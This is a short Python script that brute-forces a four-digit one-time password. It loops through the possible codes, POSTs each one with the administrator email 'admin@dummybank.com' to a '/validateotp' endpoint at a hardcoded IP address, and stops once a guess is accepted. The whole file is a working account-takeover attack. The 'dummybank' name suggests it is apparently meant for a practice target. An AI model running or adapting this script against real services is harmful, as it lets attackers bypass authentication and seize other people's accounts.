import requests
import json

baseUrl = 'http://192.144.238.3:8081'

def makeRequest(otp, email):
    global baseUrl
    data = {"otp":otp, "email":email}
    headers = {"Content-Type":"application/json"}
    r = requests.post(baseUrl + "/validateotp",
            data = json.dumps(data),
            headers = headers)

    return r.json()

adminEmailID = "admin@dummybank.com"

for otp in range(1000, 9999):
    resp = makeRequest(otp,adminEmailID)
    if "Error" not in resp:
        print "Response:", resp
        print "Correct OTP is %s!" %(otp)
        break
        